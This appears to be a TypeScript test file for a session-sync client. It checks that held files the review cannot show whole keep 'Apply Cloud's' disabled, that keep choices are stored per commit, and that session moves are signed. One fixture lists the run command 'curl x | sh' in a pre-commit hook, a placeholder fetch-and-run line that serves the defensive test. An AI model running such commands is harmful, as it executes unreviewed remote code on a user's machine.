test("Apply Cloud's stays off for held files the review could not show whole, and the card says how to apply them in git: binary, too big, cut short, more commands than shown, more files than reviewed (F-4, m-c)", () => {
  const props = { sessionId: "s1", busy: false, problem: null, onKeep: () => {}, onReview: () => {}, onApply: () => {} };
  const commit = "c".repeat(40);
  const runs = Array.from({ length: 20 }, (_, i) => `echo ${i}`);
  const cases = [
    { paths: [".husky/pre-commit"], commit, files: [{ path: ".husky/pre-commit", change: "binary" as const, diff: "", runs: ["curl x | sh"] }] },
    { paths: [".claude/settings.json"], commit, files: [{ path: ".claude/settings.json", change: "too_big" as const, diff: "" }] },
    { paths: ["CLAUDE.md"], commit, files: [{ path: "CLAUDE.md", change: "changed" as const, diff: "+x\n", truncated: true }] },
    { paths: [".claude/settings.json"], commit, files: [{ path: ".claude/settings.json", change: "changed" as const, diff: "+x\n", runs, more_runs: 1 }] },
    { paths: Array.from({ length: 101 }, (_, i) => `.claude/agents/a${i}.md`), commit, files: Array.from({ length: 100 }, (_, i) => ({ path: `.claude/agents/a${i}.md`, change: "added" as const, diff: "+x\n" })) },
  ];
  for (const held of cases) {
    expect(heldApplyReady(held, true)).toBe(false);
    const open = render(createElement(HeldReview, { held, reviewing: true, ...props }));
    expect(open).toMatch(/<button[^>]*disabled=""[^>]*>Apply Cloud&#x27;s<\/button>/);
    expect(open).toContain("refs/caveman/held/s1");
  }
  expect(render(createElement(HeldReview, { held: cases[3]!, reviewing: true, ...props }))).toContain("and 1 more not shown");
  expect(render(createElement(HeldReview, { held: cases[4]!, reviewing: true, ...props }))).toContain("101 files are more than a review shows here");
  // Every file shown whole: Apply is on.
  expect(heldApplyReady({ paths: ["CLAUDE.md"], commit, files: [{ path: "CLAUDE.md", change: "changed", diff: "+x\n", runs }] }, true)).toBe(true);
});

test("Keep this Mac's is remembered for the hold it answered, by its commit: a later return holding the same paths shows the card again (F-6)", () => {
  const box = new Map<string, string>();
  const storage = { getItem: (k: string) => box.get(k) ?? null, setItem: (k: string, v: string) => void box.set(k, v) };
  const first = { paths: [".env.example", ".mcp.json"], commit: "a".repeat(40) };
  expect(heldKept(storage, "s1", first)).toBe(false);
  keepHeld(storage, "s1", first);
  expect(heldKept(storage, "s1", first)).toBe(true);
  // The next return holds the same paths under a new commit: asked again.
  expect(heldKept(storage, "s1", { ...first, commit: "b".repeat(40) })).toBe(false);
  expect(heldKept(storage, "s2", first)).toBe(false);
  expect(heldKept(storage, "s1", { paths: [] })).toBe(false);
});

test("coming back over changes made here is asked once, naming them, and the yes travels with the same signed move (R4)", async () => {
  // What the question names: the files, a count past five, and commits made here.
  expect(setAsideLine({ files: ["notes.txt"], total: 1, commits: 0, kept_ref: "refs/caveman/kept/s1" })).toBe("notes.txt");
  expect(setAsideLine({ files: ["a", "b", "c", "d", "e", "f"], total: 9, commits: 0, kept_ref: "r" })).toBe("a, b, c, d, e and 4 more");
  expect(setAsideLine({ files: [], total: 0, commits: 2, kept_ref: "r" })).toBe("2 commits");
  expect(setAsideLine({ files: ["a"], total: 1, commits: 1, kept_ref: "r" })).toBe("a, and 1 commit");
  // The yes rides beside what the device signs (the move itself is the same), and only when the person gave it.
  const desktop = await webCryptoDeviceKey({ ...(await newDeviceKeyPair()), name: "Mac B", kind: "mac" });
  const calls: Array<{ method: string; params: any }> = [];
  const own = { call: async (method: string, params: any) => (calls.push({ method, params }), method === "cloud.status" ? { computer_id: "pc-b" } : { pending: false }) } as never;
  await pullToThisMac(own, "s1", { device: async () => desktop });
  await pullToThisMac(own, "s1", { device: async () => desktop, replace: true });
  const [asked, yes] = calls.filter((c) => c.method === "session.move").map((c) => c.params);
  expect("replace" in asked).toBe(false);
  expect(yes.replace).toBe(true);
  expect(await verifyMove(desktop.public_key, { session_id: "s1", request_id: yes.request_id, to: { computer_id: "pc-b" }, at: yes.device.at }, yes.device.signature)).toBe(true);
});
